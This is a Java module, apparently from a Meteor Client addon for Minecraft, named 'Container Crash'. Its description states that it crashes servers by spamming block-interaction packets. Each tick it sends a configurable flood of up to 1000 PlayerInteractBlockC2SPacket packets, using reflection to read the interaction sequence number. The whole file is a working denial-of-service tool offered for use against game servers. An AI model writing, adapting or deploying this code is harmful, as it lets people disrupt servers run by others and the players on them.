package im.hira.tweaks.modules.Crash;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.ClientPlayerInteractionManager;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import java.lang.reflect.Field;

import im.hira.tweaks.MCM4MC;

public class ContainerCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send per tick.")
        .defaultValue(100)
        .min(1)
        .sliderMax(1000)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build()
    );

    public ContainerCrash() {
        super(MCM4MC.JH_CRASH_CAT, "Container Crash", "Attempts to crash servers by spamming block interaction packets.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (Utils.canUpdate()) {
            for (int i = 0; i < amount.get(); i++) sendInteract();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    private void sendInteract() {
        BlockPos pos = mc.player.getBlockPos().down();
        BlockHitResult hitResult = new BlockHitResult(mc.player.getPos(), Direction.UP, pos, false);

        int sequence = 0;  // Fallback value
        try {
            Field seqField = ClientPlayerInteractionManager.class.getDeclaredField("sequence");
            seqField.setAccessible(true);
            sequence = seqField.getInt(mc.interactionManager);
            // Optionally increment for the next packet (mimics vanilla behavior, but not strictly needed for crashing)
            seqField.setInt(mc.interactionManager, sequence + 1);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            // Log or ignore; fallback to 0 for crash purposes
            // e.g., System.err.println("Failed to get sequence: " + e.getMessage());
        }

        mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, hitResult, sequence));
    }



    @Override
    public void onActivate() {
        // prevent crashing client menus
        if (mc.currentScreen != null && mc.currentScreen.shouldPause()) {
            toggle();
        }
    }

    @Override
    public void onDeactivate() {
        if (mc.currentScreen != null && mc.currentScreen.shouldPause()) {
            toggle();
        }
    }
}
